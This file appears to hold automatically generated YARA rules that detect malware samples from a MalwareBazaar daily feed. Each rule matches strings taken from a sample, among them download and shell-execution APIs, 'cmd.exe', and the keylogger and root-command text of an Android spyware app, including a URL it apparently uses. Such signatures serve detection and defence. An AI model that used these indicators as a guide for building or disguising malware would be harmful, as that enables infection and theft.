// YARA rules for malware-bazaar 2024-01-01 dataset
rule Windows_d05b32d4c9a924d316e2dd49394ca76a51a040654a2ef84de8c30b16be2b4c2b
{
    meta:
        description = "Auto ML: d05b32d4c9a924d316e2dd49394ca76a51a040654a2ef84de8c30b16be2b4c2b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.Net.Sockets"
        $s2 = "Socket"
        $s3 = "RegistryProxy"
        $s4 = "get_Registry"
        $s5 = "RegistryKey"
        $s6 = "DeleteValue"
        $s7 = "Registry"
        $s8 = "SocketFlags"
        $s9 = "FileSystemProxy"
        $s10 = "get_ExecutablePath"
        $s11 = "Delete"
        $s12 = "Shell"
        $s13 = "GetTempPath"
        $s14 = "RegistryValueKind"
        $s15 = "DownloadData"
        $s16 = "GetTempFileName"
        $s17 = "RegistryKeyPermissionCheck"
        $s18 = "DownloadFile"
        $s19 = "get_Temp"
        $s20 = "System.Security.Cryptography"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 93KB and
        all of them
}

rule Windows_b3119dc4cea05bef51d1f373b87d69bcff514f6575d4c92da4b1c557f8d8db8f
{
    meta:
        description = "Auto ML: b3119dc4cea05bef51d1f373b87d69bcff514f6575d4c92da4b1c557f8d8db8f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "?cmd.exe"
        $s2 = "ktp://w"
        $s3 = "KERNEL32.DLL"
        $s4 = "ADVAPI32.dll"
        $s5 = "iphlpapi.dll"
        $s6 = "USER32.dll"
        $s7 = "WININET.dll"
        $s8 = "WS2_32.dll"
        $s9 = "Windows Enhanced Storage Password Authentication Program"
        $s10 = "Authn.exe"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 46KB and
        all of them
}

rule Windows_f7873b3d8b8f6cf252b37ad3ee8a57b1754b82acc1d0840184af4ce4c237a0db
{
    meta:
        description = "Auto ML: f7873b3d8b8f6cf252b37ad3ee8a57b1754b82acc1d0840184af4ce4c237a0db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Gyv27hJ6oentEmpZop0"
        $s2 = "UOcKCJwRxGIbapihh1C"
        $s3 = "DownloadFile"
        $s4 = "set_UseShellExecute"
        $s5 = "Delete"
        $s6 = "set_GenerateExecutable"
        $s7 = "System.Net.Sockets"
        $s8 = "Socket"
        $s9 = "SocketType"
        $s10 = "SocketFlags"
        $s11 = "get_ExecutablePath"
        $s12 = "RegistryHive"
        $s13 = "RegistryKey"
        $s14 = "RegistryView"
        $s15 = "DeleteValue"
        $s16 = "QGKGux8ZiLUY7mUrLel"
        $s17 = "Registry"
        $s18 = "JOexLchMurlD1B6Pol5"
        $s19 = "user32.dll"
        $s20 = "kernel32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2060KB and
        all of them
}

rule Android_5f830ca263271deb676bc8ba77d7ecc5cd3c0731f7e01b9050fbe6f20066c47b
{
    meta:
        description = "Auto ML: 5f830ca263271deb676bc8ba77d7ecc5cd3c0731f7e01b9050fbe6f20066c47b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Download monitor-checker"
        $s2 = "Packet deleted:"
        $s3 = "Used function [Shell]:"
        $s4 = "[red]Error to exec root command"
        $s5 = "Deny to delete program"
        $s6 = "hhScreen unlocked. Close this page and enter any password to unlock. After lock screen password will back."
        $s7 = "Contact deleted"
        $s8 = "Delete program"
        $s9 = "Download MonitorChecker"
        $s10 = "!!Delete old program version before"
        $s11 = "HHInfo: When device tie to different login, delete it from account on site"
        $s12 = "https://anmon.name/mch.html"
        $s13 = " [Shell]:"
        $s14 = "\"\"a;href=https://anmon.name/mch.html"
        $s15 = "download_link_mch"
        $s16 = "settings_btn_delete_program"
        $s17 = "info_prog_shell"
        $s18 = "info_setings_KeyLoggerApps"
        $s19 = "btnDownloadChecker"
        $s20 = "btnDeleteProgram"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 20996KB and
        all of them
}

rule Windows_cdc42d582dcfc216e12fd59853ed4d26affbc1a5615d5a578872f674272dd80f
{
    meta:
        description = "Auto ML: cdc42d582dcfc216e12fd59853ed4d26affbc1a5615d5a578872f674272dd80f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "DeleteCriticalSection"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"
        $s6 = "advapi32.dll"
        $s7 = "OpenProcessToken"
        $s8 = "LookupPrivilegeValueA"
        $s9 = "DeleteFileA"
        $s10 = "comctl32.dll"
        $s11 = "AdjustTokenPrivileges"
        $s12 = "    version=\"1.0.0.0\""
        $s13 = "            version=\"6.0.0.0\""
        $s14 = "            publicKeyToken=\"6595b64144ccf1df\""
        $s15 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>"
        $s16 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>"
        $s17 = "JLKq:\\"
        $s18 = "WGETN"
        $s19 = ")$j:\\"
        $s20 = "#o:\\l"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4763KB and
        all of them
}

rule Windows_05c9c456cad09ae6bf8f5a879a0c86ccc94a5b987e14b4e3c1433672897e2577
{
    meta:
        description = "Auto ML: 05c9c456cad09ae6bf8f5a879a0c86ccc94a5b987e14b4e3c1433672897e2577"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "InitOnceExecuteOnce"
        $s2 = "msvcrt.dll"
        $s3 = "GetTempFileNameW"
        $s4 = "KERNEL32.dll"
        $s5 = "ShellExecuteExW"
        $s6 = "SHELL32.DLL"
        $s7 = "WINMM.DLL"
        $s8 = "OLE32.DLL"
        $s9 = "SHLWAPI.DLL"
        $s10 = "GetTempPathW"
        $s11 = "DeleteFileW"
        $s12 = "DeleteCriticalSection"
        $s13 = "USER32.DLL"
        $s14 = "GDI32.DLL"
        $s15 = "COMCTL32.DLL"
        $s16 = "Kernel32.DLL"
        $s17 = "Shell32.DLL"
        $s18 = "Downloads\\"
        $s19 = "Kernel32.dll"
        $s20 = "XDisk.bat"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 158KB and
        all of them
}

rule Windows_93ef4244ed371d4be51955474c1713769f7973200030d8d7a5c61877236bcb3c
{
    meta:
        description = "Auto ML: 93ef4244ed371d4be51955474c1713769f7973200030d8d7a5c61877236bcb3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uDSSh"
        $s2 = "SETUPAPI"
        $s3 = "DWMAPI"
        $s4 = "RegDeleteValueA"
        $s5 = "RegDeleteKeyA"
        $s6 = "AdjustTokenPrivileges"
        $s7 = "LookupPrivilegeValueA"
        $s8 = "OpenProcessToken"
        $s9 = "ADVAPI32.dll"
        $s10 = "ShellExecuteExA"
        $s11 = "SHELL32.dll"
        $s12 = "ole32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "SystemParametersInfoA"
        $s15 = "USER32.dll"
        $s16 = "DeleteObject"
        $s17 = "GDI32.dll"
        $s18 = "DeleteFileA"
        $s19 = "GetTempPathA"
        $s20 = "GetTempFileNameA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2045KB and
        all of them
}

rule Windows_893e517f08913e1199a8c77dcc77302c7474cfe4f202c956f4d602d38d777b42
{
    meta:
        description = "Auto ML: 893e517f08913e1199a8c77dcc77302c7474cfe4f202c956f4d602d38d777b42"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uDSSh"
        $s2 = "SETUPAPI"
        $s3 = "DWMAPI"
        $s4 = "RegDeleteValueA"
        $s5 = "RegDeleteKeyA"
        $s6 = "AdjustTokenPrivileges"
        $s7 = "LookupPrivilegeValueA"
        $s8 = "OpenProcessToken"
        $s9 = "ADVAPI32.dll"
        $s10 = "ShellExecuteExA"
        $s11 = "SHELL32.dll"
        $s12 = "ole32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "SystemParametersInfoA"
        $s15 = "USER32.dll"
        $s16 = "DeleteObject"
        $s17 = "GDI32.dll"
        $s18 = "DeleteFileA"
        $s19 = "GetTempPathA"
        $s20 = "GetTempFileNameA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2044KB and
        all of them
}

rule Windows_d2d3341ddcf1ff2a33413e05391689db8b17d1666b37bd4ef8f7ae3d73ef4352
{
    meta:
        description = "Auto ML: d2d3341ddcf1ff2a33413e05391689db8b17d1666b37bd4ef8f7ae3d73ef4352"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uDSSh"
        $s2 = "SETUPAPI"
        $s3 = "DWMAPI"
        $s4 = "RegDeleteValueA"
        $s5 = "RegDeleteKeyA"
        $s6 = "AdjustTokenPrivileges"
        $s7 = "LookupPrivilegeValueA"
        $s8 = "OpenProcessToken"
        $s9 = "ADVAPI32.dll"
        $s10 = "ShellExecuteExA"
        $s11 = "SHELL32.dll"
        $s12 = "ole32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "SystemParametersInfoA"
        $s15 = "USER32.dll"
        $s16 = "DeleteObject"
        $s17 = "GDI32.dll"
        $s18 = "DeleteFileA"
        $s19 = "GetTempPathA"
        $s20 = "GetTempFileNameA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1502KB and
        all of them
}

rule Windows_0eb49cae715e2f31551ea4afa64045540ed77ab891ba1864660b74af64a16971
{
    meta:
        description = "Auto ML: 0eb49cae715e2f31551ea4afa64045540ed77ab891ba1864660b74af64a16971"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uDSSh"
        $s2 = "SETUPAPI"
        $s3 = "DWMAPI"
        $s4 = "RegDeleteValueA"
        $s5 = "RegDeleteKeyA"
        $s6 = "AdjustTokenPrivileges"
        $s7 = "LookupPrivilegeValueA"
        $s8 = "OpenProcessToken"
        $s9 = "ADVAPI32.dll"
        $s10 = "ShellExecuteExA"
        $s11 = "SHELL32.dll"
        $s12 = "ole32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "SystemParametersInfoA"
        $s15 = "USER32.dll"
        $s16 = "DeleteObject"
        $s17 = "GDI32.dll"
        $s18 = "DeleteFileA"
        $s19 = "GetTempPathA"
        $s20 = "GetTempFileNameA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1501KB and
        all of them
}

rule Windows_1f0c96d7ee0d9664c0085394604a9137abc292a52c871f4bc3b5245627961573
{
    meta:
        description = "Auto ML: 1f0c96d7ee0d9664c0085394604a9137abc292a52c871f4bc3b5245627961573"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uDSSh"
        $s2 = "SETUPAPI"
        $s3 = "DWMAPI"
        $s4 = "RegDeleteValueA"
        $s5 = "RegDeleteKeyA"
        $s6 = "AdjustTokenPrivileges"
        $s7 = "LookupPrivilegeValueA"
        $s8 = "OpenProcessToken"
        $s9 = "ADVAPI32.dll"
        $s10 = "ShellExecuteExA"
        $s11 = "SHELL32.dll"
        $s12 = "ole32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "SystemParametersInfoA"
        $s15 = "USER32.dll"
        $s16 = "DeleteObject"
        $s17 = "GDI32.dll"
        $s18 = "DeleteFileA"
        $s19 = "GetTempPathA"
        $s20 = "GetTempFileNameA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1501KB and
        all of them
}

rule Windows_c45e0bc5947ac8141dce8305bf30acec32d2cee46afc64ec8a68cc6488e286fd
{
    meta:
        description = "Auto ML: c45e0bc5947ac8141dce8305bf30acec32d2cee46afc64ec8a68cc6488e286fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uDSSh"
        $s2 = "SETUPAPI"
        $s3 = "DWMAPI"
        $s4 = "RegDeleteValueA"
        $s5 = "RegDeleteKeyA"
        $s6 = "AdjustTokenPrivileges"
        $s7 = "LookupPrivilegeValueA"
        $s8 = "OpenProcessToken"
        $s9 = "ADVAPI32.dll"
        $s10 = "ShellExecuteExA"
        $s11 = "SHELL32.dll"
        $s12 = "ole32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "SystemParametersInfoA"
        $s15 = "USER32.dll"
        $s16 = "DeleteObject"
        $s17 = "GDI32.dll"
        $s18 = "DeleteFileA"
        $s19 = "GetTempPathA"
        $s20 = "GetTempFileNameA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2266KB and
        all of them
}

rule Windows_36b82f3db4e4b1da53252cf0f99ecfab17a09b29783e7c9881f48fe5da6645be
{
    meta:
        description = "Auto ML: 36b82f3db4e4b1da53252cf0f99ecfab17a09b29783e7c9881f48fe5da6645be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uDSSh"
        $s2 = "SETUPAPI"
        $s3 = "DWMAPI"
        $s4 = "RegDeleteValueA"
        $s5 = "RegDeleteKeyA"
        $s6 = "AdjustTokenPrivileges"
        $s7 = "LookupPrivilegeValueA"
        $s8 = "OpenProcessToken"
        $s9 = "ADVAPI32.dll"
        $s10 = "ShellExecuteExA"
        $s11 = "SHELL32.dll"
        $s12 = "ole32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "SystemParametersInfoA"
        $s15 = "USER32.dll"
        $s16 = "DeleteObject"
        $s17 = "GDI32.dll"
        $s18 = "DeleteFileA"
        $s19 = "GetTempPathA"
        $s20 = "GetTempFileNameA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1708KB and
        all of them
}

rule Windows_2f3ec648cb08ab1fde919b2be508999ef3eb501c6ccfae6d6c210a5a89a010b3
{
    meta:
        description = "Auto ML: 2f3ec648cb08ab1fde919b2be508999ef3eb501c6ccfae6d6c210a5a89a010b3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 64KB and
        all of them
}

rule Windows_42f84bfd437bf53ee05fba0c0a4d980f7d360e2ff70f2b78c11f23db2c890983
{
    meta:
        description = "Auto ML: 42f84bfd437bf53ee05fba0c0a4d980f7d360e2ff70f2b78c11f23db2c890983"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s2 = "Nursultan.exe"
        $s3 = "PSSSSSSh "
        $s4 = "s:IDS_EXTRFILESTOTEMP"
        $s5 = "s:IDS_WRONGPASSWORD"
        $s6 = "s:IDS_WRONGFILEPASSWORD"
        $s7 = "$GETPASSWORD1:SIZE"
        $s8 = "$GETPASSWORD1:CAPTION"
        $s9 = "$GETPASSWORD1:IDC_PASSWORDENTER"
        $s10 = "$GETPASSWORD1:IDOK"
        $s11 = "$GETPASSWORD1:IDCANCEL"
        $s12 = "USER32.dll"
        $s13 = "GDI32.dll"
        $s14 = "COMDLG32.dll"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHELL32.dll"
        $s17 = "ole32.dll"
        $s18 = "SHLWAPI.dll"
        $s19 = "COMCTL32.dll"
        $s20 = " delete"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2008KB and
        all of them
}

rule Windows_a057dce421f954cd0f7a88bb09a9475526290d702f62fe137a4e07bbc1385592
{
    meta:
        description = "Auto ML: a057dce421f954cd0f7a88bb09a9475526290d702f62fe137a4e07bbc1385592"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "DvSShw1rn6UTHYJWd4o"
        $s2 = "n9cyURlHrpRO83wYuPG6"
        $s3 = "LIkNurlcrvLsokomgFGX"
        $s4 = "Hw3SuRlAmibCmRsDNq6a"
        $s5 = "YURlDpgpI2G"
        $s6 = "RegistryKey"
        $s7 = "Registry"
        $s8 = "h2oKUrlBlCE4E4ChCahF"
        $s9 = "gdi32.dll"
        $s10 = "DeleteDC"
        $s11 = "kernel32.dll"
        $s12 = "user32.dll"
        $s13 = "winmm.dll"
        $s14 = "System.Security.Cryptography"
        $s15 = "CryptoStream"
        $s16 = "AesCryptoServiceProvider"
        $s17 = "ICryptoTransform"
        $s18 = "CryptoStreamMode"
        $s19 = "enmC79n7SLclSSHEQye"
        $s20 = "cRFFwKsShJ"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1771KB and
        all of them
}

rule Windows_710951956dadaaca476381818e2bb511f066805864c323fb2296ed7e3172d42e
{
    meta:
        description = "Auto ML: 710951956dadaaca476381818e2bb511f066805864c323fb2296ed7e3172d42e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PQASWVAQAPI"
        $s2 = "kernel32.dll"
        $s3 = "comctl32.dll"
        $s4 = "shell32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5402KB and
        all of them
}

rule Windows_9364086adb27bbdb8752310a0cc7b53b3efd33b9e47863acac7c2b4d956425c5
{
    meta:
        description = "Auto ML: 9364086adb27bbdb8752310a0cc7b53b3efd33b9e47863acac7c2b4d956425c5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s2 = "Compound File API failure."
        $s3 = "Cannot delete element."
        $s4 = "/Cannot delete element because access is denied."
        $s5 = "!Cannot delete read-only packages."
        $s6 = "YCannot delete because the storage is not empty. Try a recursive delete with Delete(true)."
        $s7 = "#Cannot delete the root StorageInfo."
        $s8 = "VCannot change CryptoProvider after the rights management transform settings are fixed."
        $s9 = "VCannot perform stream operation because CryptoProvider is not set to allow decryption."
        $s10 = "COnly cryptographic providers based on a block cipher are supported."
        $s11 = "#CryptoProvider object was disposed."
        $s12 = "-The CryptoProvider cannot encrypt or decrypt."
        $s13 = "SDefault value for '{0}' property is not valid because ValidateValueCallback failed."
        $s14 = "IParameter value must be a valid token or a quoted string as per RFC 2616."
        $s15 = "MA token is not valid. Refer to RFC 2616 for correct grammar of content types."
        $s16 = "AMust set ArrayType before calling ProvideValue on ArrayExtension."
        $s17 = "^Markup extension '{0}' requires '{1}' be implemented in the IServiceProvider for ProvideValue."
        $s18 = "PStaticExtension must have Member property set before ProvideValue can be called."
        $s19 = "PTypeExtension must have TypeName property set before ProvideValue can be called."
        $s20 = "VCryptoProvider does not have privileges required for decryption of the PublishLicense."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 911KB and
        all of them
}

rule Windows_3c085e47cb3925ab9a73a6f3e03b2cfe255f4b782e6916bee3eeae20af21ca20
{
    meta:
        description = "Auto ML: 3c085e47cb3925ab9a73a6f3e03b2cfe255f4b782e6916bee3eeae20af21ca20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "s:IDS_EXTRFILESTOTEMP"
        $s2 = "s:IDS_WRONGPASSWORD"
        $s3 = "s:IDS_WRONGFILEPASSWORD"
        $s4 = "$GETPASSWORD1:SIZE"
        $s5 = "$GETPASSWORD1:CAPTION"
        $s6 = "$GETPASSWORD1:IDC_PASSWORDENTER"
        $s7 = "$GETPASSWORD1:IDOK"
        $s8 = "$GETPASSWORD1:IDCANCEL"
        $s9 = "USER32.dll"
        $s10 = "GDI32.dll"
        $s11 = "ADVAPI32.dll"
        $s12 = "SHELL32.dll"
        $s13 = "ole32.dll"
        $s14 = "SHLWAPI.dll"
        $s15 = "COMCTL32.dll"
        $s16 = " delete"
        $s17 = " delete[]"
        $s18 = "`placement delete closure'"
        $s19 = "`placement delete[] closure'"
        $s20 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxzip32\\Release\\sfxzip.pdb"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1559KB and
        all of them
}

rule Windows_f9125f4046df87ddb95b4dd8d32d603850b200c5e72302157ec364b6afbd4048
{
    meta:
        description = "Auto ML: f9125f4046df87ddb95b4dd8d32d603850b200c5e72302157ec364b6afbd4048"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " delete"
        $s2 = " delete[]"
        $s3 = "`placement delete closure'"
        $s4 = "`placement delete[] closure'"
        $s5 = "AreFileApisANSI"
        $s6 = "KERNEL32.dll"
        $s7 = "DeleteCriticalSection"
        $s8 = "GetProcessHeap"
        $s9 = ":$:,:4:<:D:L:T:\\:d:l:t:|:"
        $s10 = "C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe"
        $s11 = "Aapi-ms-win-core-fibers-l1-1-1"
        $s12 = "api-ms-win-core-synch-l1-2-0"
        $s13 = "api-ms-"
        $s14 = "mscoree.dll"
        $s15 = "Aapi-ms-win-core-datetime-l1-1-1"
        $s16 = "api-ms-win-core-file-l1-2-2"
        $s17 = "api-ms-win-core-localization-l1-2-1"
        $s18 = "api-ms-win-core-localization-obsolete-l1-2-0"
        $s19 = "api-ms-win-core-processthreads-l1-1-2"
        $s20 = "api-ms-win-core-string-l1-1-0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 195KB and
        all of them
}

rule Windows_446211d2ed10ab785a224abd5e731213af864064dd484cdb74fd5b3b8ebafd10
{
    meta:
        description = "Auto ML: 446211d2ed10ab785a224abd5e731213af864064dd484cdb74fd5b3b8ebafd10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " delete"
        $s2 = " delete[]"
        $s3 = "`placement delete closure'"
        $s4 = "`placement delete[] closure'"
        $s5 = "AreFileApisANSI"
        $s6 = "KERNEL32.dll"
        $s7 = "DeleteCriticalSection"
        $s8 = "GetProcessHeap"
        $s9 = ":$:,:4:<:D:L:T:\\:d:l:t:|:"
        $s10 = "C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe"
        $s11 = "Aapi-ms-win-core-fibers-l1-1-1"
        $s12 = "api-ms-win-core-synch-l1-2-0"
        $s13 = "api-ms-"
        $s14 = "mscoree.dll"
        $s15 = "Aapi-ms-win-core-datetime-l1-1-1"
        $s16 = "api-ms-win-core-file-l1-2-2"
        $s17 = "api-ms-win-core-localization-l1-2-1"
        $s18 = "api-ms-win-core-localization-obsolete-l1-2-0"
        $s19 = "api-ms-win-core-processthreads-l1-1-2"
        $s20 = "api-ms-win-core-string-l1-1-0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 200KB and
        all of them
}

rule Windows_2139944dcc75ffd2ae23cf50fb751ebec4dffb7774764e8b4d48808f0925aedd
{
    meta:
        description = "Auto ML: 2139944dcc75ffd2ae23cf50fb751ebec4dffb7774764e8b4d48808f0925aedd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "get_Deleted"
        $s2 = "set_Deleted"
        $s3 = "<password>i__Field"
        $s4 = "<Deleted>k__BackingField"
        $s5 = "<Password>k__BackingField"
        $s6 = "<Url_image>k__BackingField"
        $s7 = "<ImageUrls>k__BackingField"
        $s8 = "<DeleteAt>k__BackingField"
        $s9 = "get_BurlyWood"
        $s10 = "get_Password"
        $s11 = "set_Password"
        $s12 = "btnTogglePassword"
        $s13 = "get_password"
        $s14 = "txtpassword"
        $s15 = "get_Url_image"
        $s16 = "set_Url_image"
        $s17 = "xpfoK.exe"
        $s18 = "gdi32.dll"
        $s19 = "User32.dll"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 620KB and
        all of them
}

rule Windows_36e763233ca3ff441f5ce71a59ec7b108f6329d27406b378758f6437a0f049c8
{
    meta:
        description = "Auto ML: 36e763233ca3ff441f5ce71a59ec7b108f6329d27406b378758f6437a0f049c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "get_Deleted"
        $s2 = "set_Deleted"
        $s3 = "<password>i__Field"
        $s4 = "<Deleted>k__BackingField"
        $s5 = "<Password>k__BackingField"
        $s6 = "<Url_image>k__BackingField"
        $s7 = "<ImageUrls>k__BackingField"
        $s8 = "<DeleteAt>k__BackingField"
        $s9 = "get_BurlyWood"
        $s10 = "get_Password"
        $s11 = "set_Password"
        $s12 = "btnTogglePassword"
        $s13 = "get_password"
        $s14 = "txtpassword"
        $s15 = "get_Url_image"
        $s16 = "set_Url_image"
        $s17 = "sRzsE.exe"
        $s18 = "gdi32.dll"
        $s19 = "User32.dll"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 620KB and
        all of them
}

rule Windows_15c7ce1bc55549efc86dea74a90f42fb4665fe15b14f760037897c772159a5b5
{
    meta:
        description = "Auto ML: 15c7ce1bc55549efc86dea74a90f42fb4665fe15b14f760037897c772159a5b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " attempts."
        $s2 = " attempts. The correct number was "
        $s3 = "executable format error"
        $s4 = "not a socket"
        $s5 = " delete"
        $s6 = " delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "AreFileApisANSI"
        $s10 = "DeleteCriticalSection"
        $s11 = "KERNEL32.dll"
        $s12 = "GetProcessHeap"
        $s13 = ".?AU_Crt_new_delete@std@@"
        $s14 = "9T:\\:d:l:t:|:"
        $s15 = "C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe"
        $s16 = "api-ms-win-core-synch-l1-2-0.dll"
        $s17 = "kernel32.dll"
        $s18 = "Bapi-ms-win-core-fibers-l1-1-1"
        $s19 = "api-ms-win-core-synch-l1-2-0"
        $s20 = "api-ms-"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 783KB and
        all of them
}

rule Android_347f1b018f643de0b9c946c94bd490a7426503869a0828b0a70b4d318fa097d6
{
    meta:
        description = "Auto ML: 347f1b018f643de0b9c946c94bd490a7426503869a0828b0a70b4d318fa097d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "res/drawable-xhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
        $s2 = "res/color/abc_search_url_text.xml"
        $s3 = "res/drawable-xxhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
        $s4 = "res/drawable-mdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
        $s5 = "res/drawable/abc_ic_voice_search_api_material.xmluRMo"
        $s6 = "res/drawable/abc_ic_search_api_material.xmlu"
        $s7 = "res/drawable/abc_ic_go_search_api_material.xmlu"
        $s8 = "res/layout-v16/notification_template_custom_big.xml"
        $s9 = "res/layout-v21/notification_template_custom_big.xml"
        $s10 = "res/layout-v21/notification_template_icon_group.xmlu"
        $s11 = "res/drawable-hdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
        $s12 = "res/layout/notification_template_part_time.xmlu"
        $s13 = "res/layout/notification_template_part_chronometer.xmlu"
        $s14 = "res/layout/notification_template_icon_group.xmlu"
        $s15 = "res/layout-v17/notification_template_custom_big.xml"
        $s16 = "!!res/color/abc_search_url_text.xml"
        $s17 = "<<res/drawable-hdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
        $s18 = "<<res/drawable-mdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
        $s19 = "==res/drawable-xhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
        $s20 = ">>res/drawable-xxhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 2278KB and
        all of them
}

rule Linux_a13e0cd88d10bfa8f7bb89eca2ea0859f19fd1d27874b40d23ebca03406d6f40
{
    meta:
        description = "Auto ML: a13e0cd88d10bfa8f7bb89eca2ea0859f19fd1d27874b40d23ebca03406d6f40"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
